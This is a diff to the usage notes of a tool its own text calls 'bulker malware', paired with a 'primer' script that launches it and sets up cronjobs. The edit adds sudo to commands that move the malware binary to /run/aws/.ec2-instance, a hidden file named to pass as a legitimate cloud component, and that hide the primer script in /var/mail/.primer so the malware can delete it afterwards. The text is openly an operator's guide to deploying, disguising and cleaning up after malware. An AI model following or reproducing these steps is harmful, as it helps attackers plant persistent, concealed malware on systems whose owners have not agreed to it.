@@ -10,11 +10,11 @@ The primer script is to be used to start the bulker malware, and create cronjobs
 Before using primer:
 
     
-    mkdir -p /run/aws ; mv bulker /run/aws/.ec2-instance && chmod 511 /run/aws/.ec2-instance
+    sudo mkdir -p /run/aws ; sudo mv bulker /run/aws/.ec2-instance && sudo chmod 511 /run/aws/.ec2-instance
     
     
 If you wish to have primer deleted after bulker execution, hide the primer script by doing:
 
-    mv primer /var/mail/.primer
+    sudo mv primer /var/mail/.primer
     
 The bulker malware will look to see if the primer script is located there, and if it is found, it will delete it.
